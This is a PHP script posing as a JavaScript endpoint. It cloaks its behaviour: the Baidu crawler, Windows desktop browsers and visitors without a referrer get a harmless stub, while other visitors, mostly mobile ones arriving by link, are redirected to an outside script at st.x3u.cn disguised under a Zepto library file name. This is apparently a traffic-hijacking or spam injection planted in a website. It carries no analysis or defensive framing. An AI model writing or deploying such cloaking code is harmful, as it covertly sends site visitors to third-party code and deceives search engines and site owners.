<?php
error_reporting(0);
$ua=$_SERVER['HTTP_USER_AGENT'];
$ip=get_client_ip();
if(stripos($ua,'Baiduspider')!==false){
	showJs();
	exit;
}
if(ispc()){
	showJs();
	exit;
}
if($_SERVER['HTTP_REFERER']==''){
	showJs();
	exit;
}
header('Location:http://st.x3u.cn/zepto.1.1.132.js');
function ispc(){
	$agent = strtolower($_SERVER['HTTP_USER_AGENT']);   
	$is_pc = (strpos($agent, 'windows nt')) ? true : false;
	return $is_pc;
}
function get_client_ip() {
    static $ip = NULL;
    if ($ip !== NULL) return $ip;
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $pos =  array_search('unknown',$arr);
        if(false !== $pos) unset($arr[$pos]);
        $ip   =  trim($arr[0]);
    }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $ip = (false !== ip2long($ip)) ? $ip : '0.0.0.0';
    return $ip;
}
function showJs(){
		$str='var ip="'.$ip.'";';
		$str.='function zoos_swt(){ '."\r\n".'	 openZoosUrl();'."\r\n".'}';
		header('Content-type: application/x-javascript; charset=utf-8');
		header("Expires: Mon, 26 Jul 2012 05:00:00 GMT");
		header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
		header("Cache-Control: no-cache, must-revalidate");
		header("Pramga: no-cache");	
		echo $str;
	}
?>